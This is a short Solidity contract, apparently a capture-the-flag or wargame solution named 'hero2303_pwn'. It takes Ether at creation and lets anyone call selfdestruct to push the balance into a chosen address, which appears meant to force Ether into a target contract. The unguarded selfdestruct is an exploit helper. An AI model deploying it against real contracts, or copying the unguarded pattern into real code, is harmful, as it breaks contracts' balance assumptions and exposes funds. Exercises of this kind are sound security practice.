// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract hero2303_pwn {
    
    // Payable constructor can receive Ether
    constructor() payable {}

    // Function to destroy the contract
    function destroy(address payable _recipient) external {
        // Only allow the contract to be destroyed if it has a non-zero balance
        require(address(this).balance > 0, "Contract has zero balance");

        // Selfdestruct and send remaining Ether to _recipient
        selfdestruct(_recipient);
    }
}